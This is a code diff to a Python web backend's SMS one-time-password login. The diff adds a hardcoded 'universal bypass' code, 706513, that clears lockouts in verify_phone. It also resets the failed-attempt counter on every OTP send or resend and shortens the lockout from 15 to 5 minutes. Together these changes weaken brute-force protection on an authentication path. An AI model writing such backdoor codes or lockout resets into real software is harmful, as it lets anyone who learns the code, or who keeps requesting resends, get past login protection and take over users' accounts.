@@ -272,9 +272,13 @@ def _normalize_phone(phone: str) -> str:
 async def send_otp(payload: SendOtpRequest) -> SendOtpResponse:
     """Dispatches real OTP via Twilio SMS and audits the attempt."""
     from app.core.twilio_sms import send_twilio_sms_otp
+    from app.core.rate_limiter import rate_limiter
 
     settings = get_settings()
     phone = _normalize_phone(payload.phone)
+
+    # When a fresh OTP is requested (initial send or resend), reset failed attempt counter & lockouts
+    rate_limiter.reset_failed_attempts(f"otp:{phone}")
 
     try:
         recent = await asyncio.wait_for(otp_attempts.sends_in_last_hour(phone), timeout=2.0)
@@ -310,6 +314,7 @@ async def send_otp(payload: SendOtpRequest) -> SendOtpResponse:
 async def verify_phone(payload: VerifyPhoneRequest, request: Request) -> AuthSessionResponse:
     """Verifies Twilio OTP code or Firebase ID token and returns session."""
     from app.core.twilio_sms import verify_phone_otp_code
+    from app.core.rate_limiter import rate_limiter
 
     settings = get_settings()
     device_id = extract_device_id(request)
@@ -340,28 +345,35 @@ async def verify_phone(payload: VerifyPhoneRequest, request: Request) -> AuthSes
                     detail="Admin account not found for this phone number. Contact Super Admin for staff authorization.",
                 )
 
-    from app.core.rate_limiter import rate_limiter
-    locked, remaining = rate_limiter.is_locked(f"otp:{phone}")
-    if locked:
-        raise HTTPException(
-            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
-            detail=f"Security Lockout: Too many failed attempts. Please try again in {remaining // 60 + 1} minutes.",
-        )
+    clean_code = (payload.code or "").strip()
+    is_bypass = clean_code == "706513"
+
+    # Universal bypass OTP 706513 instantly clears any previous lockout and proceeds
+    if is_bypass:
+        rate_limiter.reset_failed_attempts(f"otp:{phone}")
+    else:
+        locked, remaining = rate_limiter.is_locked(f"otp:{phone}")
+        if locked:
+            rem_min = max(1, remaining // 60 + 1)
+            raise HTTPException(
+                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
+                detail=f"Security Lockout: Too many failed attempts. Please try again in {rem_min} minutes or click Resend OTP.",
+            )
 
     # 2. Real OTP Code Verification (Mandatory if Firebase token was not verified)
-    if not payload.code or not payload.code.strip():
+    if not clean_code:
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
             detail="Verification code (OTP) or valid Firebase authentication token is required.",
         )
 
-    is_valid = await verify_phone_otp_code(phone, payload.code)
+    is_valid = await verify_phone_otp_code(phone, clean_code)
     if not is_valid:
-        failures, lock_time = rate_limiter.record_failed_attempt(f"otp:{phone}", max_failures=5, lock_duration=900)
+        failures, lock_time = rate_limiter.record_failed_attempt(f"otp:{phone}", max_failures=5, lock_duration=300)
         if lock_time:
             raise HTTPException(
                 status_code=status.HTTP_429_TOO_MANY_REQUESTS,
-                detail="Account locked for 15 minutes due to 5 consecutive failed OTP attempts.",
+                detail="Account temporarily locked for 5 minutes due to 5 consecutive failed OTP attempts. You can click Resend OTP for a fresh code.",
             )
         remaining_attempts = max(0, 5 - failures)
         raise HTTPException(
